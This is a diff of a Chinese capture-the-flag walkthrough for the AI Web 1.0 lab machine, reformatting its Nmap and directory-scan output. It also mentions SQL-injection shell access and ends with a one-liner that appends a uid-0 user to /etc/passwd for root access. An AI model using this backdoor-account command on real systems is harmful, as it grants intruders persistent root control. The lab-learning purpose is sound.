@@ -23,7 +23,8 @@ sql注入碰巧又符合os-shell 可以拿到shell 之后就是一个简单的 p
 ### [](#0x01循例端口扫描 "0x01循例端口扫描")0x01循例端口扫描
 
 ```shell
-Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-06 11:24 CSTNmap scan report for 192.168.49.128Host is up (0.00021s latency).Not shown: 999 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  httpMAC Address: 00:0C:29:23:04:32 (VMware)# 详细信息:PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd|_http-title: AI Web 1.0|_http-server-header: Apache| http-robots.txt: 2 disallowed entries |_/m3diNf0/ /se3reTdir777/uploads/MAC Address: 00:0C:29:23:04:32 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop
+Starting Nmap 7.93 ( https://nmap.org )
+at 2024-07-06 11:24 CSTNmap scan report for 192.168.49.128Host is up (0.00021s latency).Not shown: 999 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  httpMAC Address: 00:0C:29:23:04:32 (VMware)# 详细信息:PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd|_http-title: AI Web 1.0|_http-server-header: Apache| http-robots.txt: 2 disallowed entries |_/m3diNf0/ /se3reTdir777/uploads/MAC Address: 00:0C:29:23:04:32 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop
 ```
 
 ##### [](#资产整理 "资产整理")资产整理
@@ -38,7 +39,10 @@ Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-06 11:24 CSTNmap scan report 
 ### [](#0x02扫描目录 "0x02扫描目录")0x02扫描目录
 
 ```shell
-+ http://192.168.49.128/index.html (CODE:200|SIZE:141)               + http://192.168.49.128/robots.txt (CODE:200|SIZE:82)                + http://192.168.49.128/server-status (CODE:403|SIZE:222) [11:48:08] 403 -  220B  - /.ht_wsr.txt[11:48:09] 403 -  223B  - /.htaccess.orig[11:48:09] 403 -  225B  - /.htaccess.sample[11:48:09] 403 -  223B  - /.htaccess.bak1[11:48:09] 403 -  223B  - /.htaccess.save[11:48:09] 403 -  223B  - /.htaccess_orig[11:48:09] 403 -  221B  - /.htaccess_sc[11:48:09] 403 -  221B  - /.htaccessBAK[11:48:09] 403 -  221B  - /.htaccessOLD[11:48:09] 403 -  222B  - /.htaccessOLD2[11:48:09] 403 -  213B  - /.htm[11:48:09] 403 -  214B  - /.html[11:48:09] 403 -  223B  - /.htpasswd_test[11:48:09] 403 -  220B  - /.httr-oauth[11:48:09] 403 -  219B  - /.htpasswds[11:48:10] 403 -  213B  - /.php[11:48:10] 403 -  224B  - /.htaccess_extra  err[11:49:00] 200 -   80B  - /robots.txt                                 [11:49:01] 403 -  222B  - /server-status[11:49:01] 403 -  223B  - /server-status/
++ http://192.168.49.128/index.html (CODE:200|SIZE:141)
++ http://192.168.49.128/robots.txt (CODE:200|SIZE:82)
++ http://192.168.49.128/server-status (CODE:403|SIZE:222)
+[11:48:08] 403 -  220B  - /.ht_wsr.txt[11:48:09] 403 -  223B  - /.htaccess.orig[11:48:09] 403 -  225B  - /.htaccess.sample[11:48:09] 403 -  223B  - /.htaccess.bak1[11:48:09] 403 -  223B  - /.htaccess.save[11:48:09] 403 -  223B  - /.htaccess_orig[11:48:09] 403 -  221B  - /.htaccess_sc[11:48:09] 403 -  221B  - /.htaccessBAK[11:48:09] 403 -  221B  - /.htaccessOLD[11:48:09] 403 -  222B  - /.htaccessOLD2[11:48:09] 403 -  213B  - /.htm[11:48:09] 403 -  214B  - /.html[11:48:09] 403 -  223B  - /.htpasswd_test[11:48:09] 403 -  220B  - /.httr-oauth[11:48:09] 403 -  219B  - /.htpasswds[11:48:10] 403 -  213B  - /.php[11:48:10] 403 -  224B  - /.htaccess_extra  err[11:49:00] 200 -   80B  - /robots.txt                                 [11:49:01] 403 -  222B  - /server-status[11:49:01] 403 -  223B  - /server-status/
 ```
 
 > 可以看到 robots.txt 除此之外没有什么别的东西了
@@ -114,6 +118,7 @@ info.php 找到了根目录
 
 ```shell
 openssl passwd -1 -salt 123 123 echo "tom:$1$123$nE5gIYTYiF1PIXVOFjQaW/:0:0:root:/root:/usr/bin/zsh">> /etc/passwdsu tom 
+
 ```
 
 拿到权限 ok 下机 —-
